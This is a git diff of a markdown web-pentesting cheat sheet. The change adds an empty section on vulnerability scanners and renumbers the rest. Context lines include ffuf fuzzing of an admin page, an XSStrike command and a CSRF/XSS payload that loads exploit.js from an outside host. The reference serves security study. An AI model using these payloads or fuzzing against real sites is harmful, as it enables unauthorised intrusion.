@@ -4,17 +4,17 @@ Overview
 ---------
 1. - [Web Requests](#1---web-requests)
 2. - [Web Proxies](#2---web-proxies)
-3. - [
-3. - [Online Resources](#3---online-resources)
-4. - [Browser Plugins](#4---browser-plugins)
-5. - [Web Reconnaissance](#5---web-reconnaissance)
-6. - [Fuzzing](#6---fuzzing)
-7. - [JavaScript Deobfuscation](#7---javascript-deobfuscation)
-8. - [Sensitive Data Exposure](#8---sensitive-data-exposure)
-9. - [HTML Injection](#9---html-injection)
-10. - [Cross-Site Scripting (XSS)](#10---cross-site-scripting-xss)
-11. - [Cross-Site Request Forgery (CSRF)](#11---cross-site-request-forgery-csrf)
-12. - [Exploit Research](#12---exploit-research)
+3. - [Web Application Vulnerability Scanners](#3---web-application-vulnerability-scanners)
+4. - [Online Resources](#4---online-resources)
+5. - [Browser Plugins](#5---browser-plugins)
+6. - [Web Reconnaissance](#6---web-reconnaissance)
+7. - [Fuzzing](#7---fuzzing)
+8. - [JavaScript Deobfuscation](#8---javascript-deobfuscation)
+9. - [Sensitive Data Exposure](#9---sensitive-data-exposure)
+10. - [HTML Injection](#10---html-injection)
+11. - [Cross-Site Scripting (XSS)](#11---cross-site-scripting-xss)
+12. - [Cross-Site Request Forgery (CSRF)](#12---cross-site-request-forgery-csrf)
+13. - [Exploit Research](#13---exploit-research)
 
    
 #1. - Web Requests
@@ -67,7 +67,12 @@ Edit /etc/proxychains4.conf
 $ proxychains <command>
 ```
 
-#3. - Online Resources
+#3. - Web Application Vulnerability Scanners
+-----------------------------------------
+
+
+
+#4. - Online Resources
 -----------------------------------------
 
 - OWASP Web Security Testing Guide
@@ -95,7 +100,7 @@ https://htmlg.com/html-editor/
 https://jsfiddle.net/
 ```
 
-#4. - Browser Plugins
+#5. - Browser Plugins
 -----------------------------------------
 
 - Wappalyzer: Website technology analyser
@@ -116,7 +121,7 @@ https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 ```
 
-#5. - Web Reconnaissance
+#6. - Web Reconnaissance
 -----------------------------------------
 
 - Whois
@@ -264,7 +269,7 @@ SpiderFoot
 OSINT Framework
 ```
 
-#6. - Fuzzing
+#7. - Fuzzing
 -----------------------------------------
 
 - Directory Fuzzing
@@ -330,7 +335,7 @@ $ for i in $(seq 1 1000); do echo $i >> ids.txt; done        # create text file 
 $ ffuf -w ids.txt:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
 ```
 
-#7. - JavaScript Deobfuscation
+#8 - JavaScript Deobfuscation
 -----------------------------------------
 
 - JavaScript Obfuscator
@@ -399,7 +404,7 @@ https://rot13.com/
 https://www.boxentriq.com/code-breaking/cipher-identifier
 ```
 
-#8. - Sensitive Data Exposure
+#9. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -410,7 +415,7 @@ OR
 CTRL + U
 ```
 
-#9. - HTML Injection
+#10. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -419,7 +424,7 @@ CTRL + U
 <a href="http://www.google.com">Click Me</a>
 ```
 
-#10. - Cross-Site Scripting (XSS)
+#11. - Cross-Site Scripting (XSS)
 -----------------------------------------
 
 *Reflected XSS (non-persistent - processed on the back-end server)	= Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).*
@@ -479,7 +484,7 @@ CTRL + U
 $ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"	
 ```
 
-#11. - Cross-Site Request Forgery (CSRF)
+#12. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -488,7 +493,7 @@ $ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#12. - Exploit Research
+#13. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
